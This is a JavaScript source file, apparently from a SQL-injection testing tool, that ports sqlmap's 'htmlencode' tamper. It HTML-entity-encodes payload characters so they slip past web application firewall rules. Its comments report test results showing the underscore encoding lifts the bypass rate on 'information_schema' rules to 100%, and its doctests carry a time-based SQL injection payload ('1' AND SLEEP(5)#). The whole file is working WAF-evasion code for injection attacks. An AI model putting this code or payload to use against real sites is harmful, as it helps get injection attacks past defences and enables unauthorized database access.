// HTML 实体编码所有非字母数字字符，绕过基于明文字符的 WAF 规则
//
// [T-7 2026-10-07] 与上游 sqlmap 1.10.10 tamper/htmlencode.py 同一算法：
//   **先把已存在的 `&#NN;` 实体解码回原字符，再统一编码**（上游 issue #5203）。
//   旧实现直接对所有非字母数字字符编码 ⇒ 已编码实体的 `&` `;` 会被再编一次
//   （`&#39;` → `&#38;#39&#59;`），即**非幂等**：链式组合或被 WAF 拦后重跑时会把
//   二次损坏的形态发给目标（本仓 P0-2 已登记的损坏源之一）。
//   解码后再编码 ⇒ f(f(x)) === f(x)，故本件显式声明 idempotent:true，
//   由 `tamper.idempotency.test.js` 的「声明即必须成立」判据守着。
// 编码集**刻意保留**本仓的 `[^a-zA-Z0-9]`（比上游的 `[^\w]` 多编一个 `_`），这是拿
//   A/B 数据定的，不是随手对齐：
//   `e2e/tamper-matrix`（离线 12 类规则）实测 —— 改成上游的 `[^\w]` 后
//   `information_schema` 那一类绕过率 **100% → 0%**（下划线留在明文里，规则直接整词命中）；
//   用回 `[^a-zA-Z0-9]` 则 12 类里 10 类命中、平均 83.3%，与改前持平。
//   上游 doctest 不含下划线 ⇒ 两条官方示例照样字面一致，"对齐"与"更强"可以兼得。
//   ⚠️ 代价是提取标记 `__S__` / `__E__` 里的下划线会被编码 —— 标记安全由
//   `applyTampers.js` 的占位保护层承担（标记在进链前已换成纯数字占位符），不靠本件让路。
export const htmlencode = {
  name: 'htmlencode',
  description: '将非字母数字字符 HTML 实体编码（&#NN;），绕过基于明文字符的规则',
  idempotent: true,
  doctests: [
    // 上游官方示例（tag 1.10.10）
    { input: "1' AND SLEEP(5)#", output: '1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;' },
    // 上游第二条：已编码输入必须原样透传（幂等）
    { input: '1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;', output: '1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;' },
    { input: 'information_schema', output: 'information&#95;schema' },
  ],
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    const src = String(payload ?? '').replace(/&#(\d+);/g, (_m, d) => {
      const cp = Number(d);
      if (!Number.isFinite(cp) || cp < 0 || cp > 0x10ffff) return `&#${d};`;
      try { return String.fromCodePoint(cp); } catch { return `&#${d};`; }
    });
    return src.replace(/[^a-zA-Z0-9]/g, (c) => '&#' + c.charCodeAt(0) + ';');
  },
};
export default htmlencode;
